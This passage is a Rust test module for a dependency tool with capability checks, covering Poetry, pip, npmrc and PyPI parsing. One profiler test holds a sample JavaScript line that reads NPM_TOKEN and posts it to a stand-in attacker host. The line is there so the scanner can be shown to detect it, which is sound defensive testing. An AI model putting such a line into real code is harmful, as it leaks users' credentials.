            [project.optional-dependencies]
            dev = [
                "charset-normalizer==3.4.0",
                "urllib3<3; python_version >= '3.0'"
            ]
            docs = ["markdown==3.6"]
            "#,
        )
        .unwrap();

        let base = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
        assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
        assert_eq!(base.specs.len(), 1);

        let dev =
            read_pyproject_requirements(&pyproject, &BTreeSet::from(["dev".to_owned()]), true)
                .unwrap();
        assert!(dev.specs.iter().any(|spec| spec.name == "idna"));
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"
                && spec.version.as_deref() == Some("==3.4.0")));
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "urllib3" && spec.version.as_deref() == Some("<3")));
        assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
    }

    #[test]
    fn reads_poetry_dependencies_and_dev_groups() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [tool.poetry.dependencies]
            python = "^3.11"
            requests = "^2.32.0"
            rich = { version = "^13.0.0", optional = true }

            [tool.poetry.extras]
            ui = ["rich"]

            [tool.poetry.dev-dependencies]
            pytest = "^8.0.0"

            [tool.poetry.group.docs]
            optional = true

            [tool.poetry.group.docs.dependencies]
            markdown = "^3.6"

            [tool.poetry.group.lint.dependencies]
            ruff = "^0.5.0"
            "#,
        )
        .unwrap();

        let base = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "requests" && spec.version.as_deref() == Some(">=2.32.0,<3")));
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some(">=8.0.0,<9")));
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some(">=0.5.0,<0.6")));
        assert!(!base.specs.iter().any(|spec| spec.name == "python"));
        assert!(!base.specs.iter().any(|spec| spec.name == "rich"));
        assert!(!base.specs.iter().any(|spec| spec.name == "markdown"));

        let production = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap();
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
        assert!(production.specs.iter().any(|spec| spec.name == "ruff"));

        let with_extra =
            read_pyproject_requirements(&pyproject, &BTreeSet::from(["ui".to_owned()]), false)
                .unwrap();
        assert!(with_extra
            .specs
            .iter()
            .any(|spec| spec.name == "rich" && spec.version.as_deref() == Some(">=13.0.0,<14")));

        let with_docs =
            read_pyproject_requirements(&pyproject, &BTreeSet::from(["docs".to_owned()]), false)
                .unwrap();
        assert!(with_docs
            .specs
            .iter()
            .any(|spec| spec.name == "markdown" && spec.version.as_deref() == Some(">=3.6,<4")));
    }

    #[test]
    fn reads_poetry_direct_wheel_sources() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        let wheel = dir
            .path()
            .join("wheels")
            .join("local_idna-3.7-py3-none-any.whl");
        fs::create_dir_all(wheel.parent().unwrap()).unwrap();
        fs::write(&wheel, b"not a real wheel").unwrap();
        fs::write(
            &pyproject,
            r#"
            [tool.poetry.dependencies]
            idna = { url = "https://example.invalid/idna-3.7-py3-none-any.whl" }
            local-idna = { path = "wheels/local_idna-3.7-py3-none-any.whl" }
            "#,
        )
        .unwrap();

        let requirements = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
        let idna = requirements
            .specs
            .iter()
            .find(|spec| spec.name == "idna")
            .unwrap();
        assert_eq!(
            idna.direct_url.as_deref(),
            Some("https://example.invalid/idna-3.7-py3-none-any.whl")
        );

        let local = requirements
            .specs
            .iter()
            .find(|spec| spec.name == "local-idna")
            .unwrap();
        assert!(local.direct_url.as_deref().unwrap().starts_with("file://"));
        assert!(local
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("local_idna-3.7-py3-none-any.whl"));
    }

    #[test]
    fn rejects_poetry_unsupported_direct_sources() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [tool.poetry.dependencies]
            local-package = { path = "../local-package" }
            git-package = { git = "https://example.invalid/pkg.git" }
            "#,
        )
        .unwrap();

        let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported Poetry dependency source"));
    }

    #[test]
    fn reads_poetry_lock_constraints_and_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let poetry_lock = dir.path().join("poetry.lock");
        fs::write(
            &poetry_lock,
            r#"
            [[package]]
            name = "idna"
            version = "3.7"
            files = [
                {file = "idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
                {file = "idna-3.7.tar.gz", hash = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
            ]

            [[package]]
            name = "charset-normalizer"
            version = "3.4.0"

            [metadata.files]
            charset-normalizer = [
                {file = "charset_normalizer-3.4.0-py3-none-any.whl", hash = "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"},
            ]
            "#,
        )
        .unwrap();

        let requirements = read_poetry_lock_requirements(&poetry_lock).unwrap();
        assert_eq!(
            requirements
                .constraints
                .get("pypi:idna")
                .map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            requirements
                .constraints
                .get("pypi:charset-normalizer")
                .map(String::as_str),
            Some("3.4.0")
        );
        assert_eq!(
            requirements.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
            ])
        );
        assert_eq!(
            requirements
                .hashes
                .get("pypi:charset-normalizer")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc")
        );
    }

    #[test]
    fn discovers_poetry_lock_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("pyproject.toml"),
            r#"
            [tool.poetry.dependencies]
            python = "^3.11"
            idna = "^3.0"
            "#,
        )
        .unwrap();
        fs::write(
            dir.path().join("poetry.lock"),
            r#"
            [[package]]
            name = "idna"
            version = "3.7"
            files = [
                {file = "idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
            ]
            "#,
        )
        .unwrap();

        let requirements = discover_project_requirements(dir.path()).unwrap();
        assert!(requirements
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=3.0,<4")));
        assert_eq!(
            requirements
                .constraints
                .get("pypi:idna")
                .map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            requirements
                .hashes
                .get("pypi:idna")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn parses_pypi_requires_dist_with_extras() {
        let spec = parse_pypi_requirement("urllib3<3,>=1.21.1").unwrap();
        assert_eq!(spec.name, "urllib3");
        assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

        assert!(parse_pypi_requirement("PySocks>=1.5.6; extra == 'socks'").is_none());

        let extras = BTreeSet::from(["socks".to_owned()]);
        let spec = parse_pypi_requirement_with_extras("PySocks>=1.5.6; extra == 'socks'", &extras)
            .unwrap();
        assert_eq!(spec.name, "pysocks");
        assert_eq!(spec.version.as_deref(), Some(">=1.5.6"));
    }

    #[test]
    fn merges_pypi_constraints_into_requirements() {
        let spec = PackageSpec::new(Ecosystem::Pypi, "urllib3", Some("<3,>=1.21.1".to_owned()));
        let constraints = BTreeMap::from([("pypi:urllib3".to_owned(), "==2.2.1".to_owned())]);
        assert_eq!(
            constrained_pypi_requirement(&spec, &constraints).as_deref(),
            Some("<3,>=1.21.1,==2.2.1")
        );
    }

    #[test]
    fn evaluates_common_pypi_markers() {
        let env = PypiMarkerEnvironment {
            python_full_version: Some("3.11.4".to_owned()),
            os_name: "posix".to_owned(),
            sys_platform: "darwin".to_owned(),
            platform_system: "Darwin".to_owned(),
            platform_machine: "arm64".to_owned(),
            implementation_name: "cpython".to_owned(),
            platform_python_implementation: "CPython".to_owned(),
            extra: String::new(),
        };

        assert_eq!(
            evaluate_pypi_marker("python_version >= '3.0'", &env),
            Some(true)
        );
        assert_eq!(
            evaluate_pypi_marker("python_version < '0'", &env),
            Some(false)
        );
        assert_eq!(
            evaluate_pypi_marker("os_name == 'posix' or python_version < '0'", &env),
            Some(true)
        );
        assert_eq!(
            evaluate_pypi_marker("os_name == 'nt' and python_version >= '3.0'", &env),
            Some(false)
        );
    }

    #[test]
    fn parses_requirement_continuations_and_hash_options() {
        let lines = requirement_logical_lines(
            "idna==3.7 \\\n  --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \\\n  --hash sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
        );
        assert_eq!(lines.len(), 1);

        let parsed = parse_requirement_line(&lines[0]);
        assert_eq!(parsed.requirement, "idna==3.7");
        assert!(parsed
            .hashes
            .contains("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"));
        assert!(parsed
            .hashes
            .contains("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"));
    }

    #[test]
    fn applies_requires_python_constraints() {
        let file = PypiFile {
            filename: "pkg-1.0.0-py3-none-any.whl".to_owned(),
            packagetype: "bdist_wheel".to_owned(),
            url: "https://example.invalid/pkg.whl".to_owned(),
            digests: PypiDigests {
                sha256: "abc".to_owned(),
            },
            requires_python: Some(">=3.10".to_owned()),
        };
        assert!(!pypi_file_python_compatible(&file, Some("3.9.6")));
        assert!(pypi_file_python_compatible(&file, Some("3.11.0")));
    }

    #[test]
    fn skips_pypi_source_distributions() {
        let doc = PypiResponse {
            info: PypiInfo {
                name: "source-only".to_owned(),
                version: "1.0.0".to_owned(),
                requires_dist: None,
            },
            urls: vec![PypiFile {
                filename: "source-only-1.0.0.tar.gz".to_owned(),
                packagetype: "sdist".to_owned(),
                url: "https://example.invalid/source-only-1.0.0.tar.gz".to_owned(),
                digests: PypiDigests {
                    sha256: "abc".to_owned(),
                },
                requires_python: None,
            }],
        };

        assert!(choose_pypi_file(&doc, Some("3.11.0")).is_none());
    }

    #[test]
    fn checks_wheel_tags_against_python_platform() {
        let compatibility = PythonWheelCompatibility::new(
            3,
            9,
            "cpython",
            "cpython-39",
            "macosx_10_9_universal2",
            "arm64",
            "14.0.0",
        );

        assert!(wheel_tag_compatible(
            "idna-3.7-py3-none-any.whl",
            &compatibility
        ));
        assert!(wheel_tag_compatible(
            "orjson-3.10.18-cp39-cp39-macosx_10_15_x86_64.macosx_11_0_arm64.macosx_10_15_universal2.whl",
            &compatibility
        ));
        assert!(!wheel_tag_compatible(
            "orjson-3.10.18-cp310-cp310-macosx_11_0_arm64.whl",
            &compatibility
        ));
        assert!(!wheel_tag_compatible(
            "orjson-3.10.18-cp39-cp39-win_amd64.whl",
            &compatibility
        ));
    }

    #[test]
    fn profiler_turns_host_access_into_capabilities() {
        let mut profiler = SourceProfiler::default();
        profiler.scan_file(
            "index.js",
            "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
        );
        let profile = profiler.finish();
        assert!(profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::EnvRead));
        assert!(profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::HttpRequest));
    }

    #[test]
    fn profiler_ignores_tests_and_packaging_files() {
        let mut profiler = SourceProfiler::default();
        profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
        profiler.scan_file("pkg/setup.py", "open('README.md').read()");
        let profile = profiler.finish();
        assert!(profile.capabilities.is_empty());
        assert_eq!(profile.files_scanned, 0);
    }

    #[test]
    fn parses_console_script_entry_points() {
        let entries = parse_console_scripts(
            r#"
            [console_scripts]
            normalizer = charset_normalizer.cli.normalizer:cli_detect

            [gui_scripts]
            ignored = ignored:main
            "#,
        );
        assert_eq!(
            entries,
            vec![PythonEntryPoint {
                name: "normalizer".to_owned(),
                module: "charset_normalizer.cli.normalizer".to_owned(),
                function: "cli_detect".to_owned(),
            }]
        );
    }

    #[test]
    fn python_entry_points_strip_global_site_packages() {
        let script = python_entry_point_script(&PythonEntryPoint {
            name: "normalizer".to_owned(),
            module: "charset_normalizer.cli.normalizer".to_owned(),
            function: "cli_detect".to_owned(),
        });

        assert!(script.contains("Path(__file__).resolve().parents[1] / \"site-packages\""));
        assert!(script.contains("\"site-packages\" not in path"));
        assert!(script.contains("\"dist-packages\" not in path"));
    }

    #[test]
    fn parses_capability_grants() {
        assert_eq!(
            parse_capability_grant("http:api.example.com").unwrap(),
            Capability::HttpHost("api.example.com".to_owned())
        );
        assert_eq!(
            parse_capability_grant("env:API_TOKEN").unwrap(),
            Capability::EnvRead("API_TOKEN".to_owned())
        );
        assert_eq!(
            parse_capability_grant("dynamic-eval").unwrap(),
            Capability::DynamicEval
        );
    }

    #[test]
    fn parses_npmrc_registry_and_auth_config() {
        let mut config = NpmConfig::default();
        parse_npmrc_content(
            r#"
            registry=https://registry.example.invalid/npm
            @scope:registry=https://scope.example.invalid/
            //scope.example.invalid/:_authToken=scope-token
            //registry.example.invalid/npm/:_authToken=default-token
            "#,
            &mut config,
        );

        assert_eq!(config.registry, "https://registry.example.invalid/npm/");
        assert_eq!(
            config.registry_for("left-pad"),
            "https://registry.example.invalid/npm/"
        );
        assert_eq!(
            config.registry_for("@scope/pkg"),
            "https://scope.example.invalid/"
        );
        assert_eq!(
            config.auth_token_for_url("https://scope.example.invalid/@scope%2fpkg"),
            Some("scope-token")
        );
        assert_eq!(
            config
                .auth_token_for_url("https://registry.example.invalid/npm/left-pad/-/left-pad.tgz"),
            Some("default-token")
        );
    }

    #[test]
    fn reads_manifest_policy_grants_and_pypi_indexes() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("omc.toml"),
            r#"
            [project]
            name = "policy-demo"
            version = "0.1.0"

            [policy]
            allow = ["http:api.example.com", "env:API_TOKEN"]

            [registries]
            pypi-index-url = "https://mirror.example/simple"
            pypi-extra-index-urls = ["https://extra.example/simple"]
            "#,
        )
        .unwrap();

        let options = options_with_manifest_policy(&LinkOptions::new(dir.path())).unwrap();
        assert!(options
            .allowed_capabilities
            .contains(&Capability::HttpHost("api.example.com".to_owned())));
        assert!(options
            .allowed_capabilities
            .contains(&Capability::EnvRead("API_TOKEN".to_owned())));
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://mirror.example/simple/")
        );
        assert_eq!(
            options.pypi_extra_index_urls,
            vec!["https://extra.example/simple/".to_owned()]
        );
    }

    #[test]
    fn applies_pypi_environment_indexes() {
        let dir = tempfile::tempdir().unwrap();
        let mut options = LinkOptions::new(dir.path());
        apply_pypi_environment_values(
            &mut options,
            dir.path(),
            Some("https://env.example/simple"),
            Some("https://extra.example/simple 'https://quoted.example/simple' https://extra.example/simple"),
            Some("./wheelhouse https://files.example/packages"),
            true,
            true,
        );

        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://env.example/simple/")
        );
        assert_eq!(
            options.pypi_extra_index_urls,
            vec![
                "https://extra.example/simple/".to_owned(),
                "https://quoted.example/simple/".to_owned(),
            ]
        );
        assert_eq!(
            options.pypi_find_links,
            vec![
                dir.path()
                    .join(".")
                    .join("wheelhouse")
                    .to_string_lossy()
                    .into_owned(),
                "https://files.example/packages".to_owned(),
            ]
        );
        assert!(options.pypi_no_index);

        apply_pypi_environment_values(
            &mut options,
            dir.path(),
            Some("https://ignored.example/simple"),
            Some("https://another.example/simple"),
            Some("./wheelhouse"),
            false,
            false,
        );
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://env.example/simple/")
        );
        assert_eq!(
            options.pypi_extra_index_urls,
            vec![
                "https://extra.example/simple/".to_owned(),
                "https://quoted.example/simple/".to_owned(),
                "https://another.example/simple/".to_owned(),
            ]
        );

        let mut options = LinkOptions::new(dir.path());
        options.pypi_index_url = Some("https://pip-config.example/simple/".to_owned());
        apply_pypi_environment_values(&mut options, dir.path(), None, None, None, false, true);
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://pip-config.example/simple/")
        );
        apply_pypi_environment_values(
            &mut options,
            dir.path(),
            Some("https://env-override.example/simple"),
            None,
            None,
            false,
            true,
        );
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://env-override.example/simple/")
        );
    }

    #[test]
    fn parses_pip_config_indexes() {
        let dir = tempfile::tempdir().unwrap();
        let mut config = PipConfig::default();
        parse_pip_config_content(
            r#"
            [global]
            index-url = https://global.example/simple
            extra-index-url = https://extra.example/simple 'https://quoted.example/simple'
            find-links = ./wheelhouse

            [install]
            extra-index-url =
                https://install-extra.example/simple
                https://extra.example/simple
            find-links =
                https://files.example/packages
                ./wheelhouse
            no-index = true

            [download]
            index-url = https://ignored.example/simple
            "#,
            dir.path(),
            &mut config,
        );

        assert_eq!(
            config.index_url.as_deref(),
            Some("https://global.example/simple/")
        );
        assert_eq!(
            config.extra_index_urls,
            vec![
                "https://extra.example/simple/".to_owned(),
                "https://quoted.example/simple/".to_owned(),
                "https://install-extra.example/simple/".to_owned(),
            ]
        );
        assert_eq!(
            config.find_links,
            vec![
                dir.path()
                    .join(".")
                    .join("wheelhouse")
                    .to_string_lossy()
                    .into_owned(),
                "https://files.example/packages".to_owned(),
            ]
        );
        assert!(config.no_index);
    }

    #[test]
    fn generated_profile_module_rejects_capabilities_by_default() {
        let package = ResolvedPackage {
            ecosystem: Ecosystem::Npm,
            name: "date-helper".to_owned(),
            version: "1.2.4".to_owned(),
            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
            download_url: None,
            local_path: None,
            filename: "date-helper.tgz".to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: false,
            pypi_direct_wheel: false,
            npm_scripts: BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        };
        let findings = vec![CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "process.env".to_owned(),
        }];
        let module = module_from_profile(&package, &findings);
        let error = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(error
            .findings
            .iter()
            .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
    }

    fn npm_tgz_for_test(package_json: &str) -> Vec<u8> {
        let mut bytes = Vec::new();
        {
            let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
            let mut archive = tar::Builder::new(encoder);
            let mut header = tar::Header::new_gnu();
            header.set_size(package_json.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive
                .append_data(&mut header, "package/package.json", package_json.as_bytes())
                .unwrap();
            let encoder = archive.into_inner().unwrap();
            encoder.finish().unwrap();
        }
        bytes
    }

    fn locked_package_for_test(ecosystem: Ecosystem, name: &str, version: &str) -> LockedPackage {
        LockedPackage {
            ecosystem,
            name: name.to_owned(),
            version: version.to_owned(),
            source_url: format!("https://example.invalid/{name}-{version}.tgz"),
            archive: format!(".omc/cache/{name}-{version}.tgz"),
            artifact: format!(".omc/artifacts/{name}-{version}/omc.json"),
            sha256: "0".repeat(64),
            behavior: Behavior::Pure,
            verdict: Verdict::Accepted,
            dependencies: Vec::new(),
            optional_dependencies: Vec::new(),
            grants: Vec::new(),
            capabilities: Vec::new(),
            verifier_findings: Vec::new(),
        }
    }
}
